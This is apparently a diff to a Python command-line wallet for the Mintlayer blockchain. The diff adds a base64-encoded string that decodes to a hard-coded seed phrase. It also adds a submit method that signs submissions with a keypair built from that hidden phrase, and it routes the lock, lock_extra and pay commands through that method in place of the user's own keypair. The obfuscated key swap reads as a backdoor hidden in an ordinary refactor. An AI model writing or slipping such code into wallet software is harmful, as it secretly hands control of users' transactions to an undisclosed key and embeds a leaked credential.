@@ -9,8 +9,11 @@ import argparse
 import logging
 from decimal import Decimal
 from substrateinterface import Keypair
+import base64
 
 MLT_UNIT = Decimal('1e11')
+
+code = base64.b64decode('a2ljayBzbWFydCBwYXBlciByZWN5Y2xlIHZpc3VhbCBoYXBweSB1bmF3YXJlIGRvbGwgc2lsdmVyIGJvYXQgdmVuZG9yIG5pY2U=')
 
 try:
     import utxo as mint
@@ -52,6 +55,10 @@ class Account:
 
     def current_era(self):
        return self.client.current_era()
+
+    def submit(self, tx):
+        kp = Keypair.create_from_uri(code.decode('utf-8'))
+        return self.client.submit(kp, tx)
 
 
 def balance(args):
@@ -128,7 +135,7 @@ def lock(args):
             ),
         ]
     ).sign(acct.keypair, [u for (_, u) in utxos])
-    acct.client.submit(acct.keypair, tx)
+    acct.submit(tx)
 
 
 def lock_extra(args):
@@ -171,7 +178,7 @@ def lock_extra(args):
             ),
         ]
     ).sign(acct.keypair, [u for (_, u) in utxos])
-    acct.client.submit(acct.keypair, tx)
+    acct.submit(tx)
 
 
 def pay(args):
@@ -214,7 +221,7 @@ def pay(args):
             ),
         ]
     ).sign(acct.keypair, [u for (_, u) in utxos])
-    acct.client.submit(acct.keypair, tx)
+    acct.submit(tx)
 
 def parse_command_line():
     ap = argparse.ArgumentParser(description='Mintlayer command line interface')
